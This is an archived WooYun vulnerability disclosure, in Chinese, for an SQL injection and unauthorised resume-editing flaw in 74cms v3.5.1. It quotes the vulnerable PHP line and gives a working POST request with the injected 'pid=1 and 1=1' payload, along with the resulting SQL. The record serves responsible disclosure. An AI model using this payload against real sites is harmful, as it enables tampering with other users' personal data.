{"id": 47654, "wybug_id": "wooyun-2014-080112", "wybug_title": "骑士人才系统 sql注入+越权修改任何人简历", "wybug_corp": "74c,s.com", "wybug_author": "menmen519", "wybug_date": "2014-10-20 16:41", "wybug_open_date": "2015-01-18 16:42", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-23：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-18：\t细节向公众公开  简要描述： 骑士人才系统 sql注入+越权修改任何人简历 详细说明：  wap_user.php:\n$setsqlarr['trade_cn']=trim($_POST['trade_cn'])?trim($_POST['trade_cn']):exit(\"请选择期望行业\");\t$setsqlarr['district_cn']=trim($_POST['district_cn'])?trim($_POST['district_cn']):exit(\"请选择期望工作地区\");\t$setsqlarr['district']=trim($_POST['district']);\t$setsqlarr['sdistrict']=trim($_POST['sdistrict']);\tif(!updatetable(table('resume'),$setsqlarr,\" id=$_POST[pid] \"))exit(\"err\");\n主要看到这一句updatetable(table('resume'),$setsqlarr,\" id=$_POST[pid] \"这里的  id=$_POST[pid]  没有做任何处理，所以可以注入简单的 and 1=1这里不是主要的 在qs_resume表里面的简历信息的主键id 通过id控制的，也就是说我们提交的$_POST[pid] 可以任意修改任何一条记录访问url:POST /74cms_v3.5.1_20141015/upload/wap/personal/wap_user.php?act=resume_jobs_save HTTP/1.1Host: localhostpostdata：提交pid=1 and 1=1 抓到sql语句为;UPDATE qs_resume SET `intention_jobs`='\\xCF\\xFA\\xCA\\xDB\\xD0\\xD0\\xD5\\xFE\\xC9\\xCC\\xCE\\xF1/\\xCF\\xFA\\xCA\\xDB\\xD0\\xD0\\xD5\\xFE\\xC8\\xCBԱ', `wage`='59', `wage_cn`='3000~5000Ԫ/\\xD4\\xC2', `nature`='63', `nature_cn`='\\xBC\\xE6ְ', `trade`='5', `trade_cn`='\\xCD\\xF8\\xC2\\xE7\\xD3\\xCEϷ', `district_cn`='\\xBAӱ\\xB1ʡ/\\xBA\\xAA\\xB5\\xA6\\xCA\\xD0', `district`='5', `sdistrict`='133' WHERE  id=1 and 1=1我们可以任意修改信息   漏洞证明：     修复方案：     版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-10-20 16:48 厂商回复： 感谢反馈！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-11-01 23:48 |    \t\tSLAckEr \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:23        | 安全爱好者 ID：小歪)\t\t \n  求大牛QQ  ：）    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}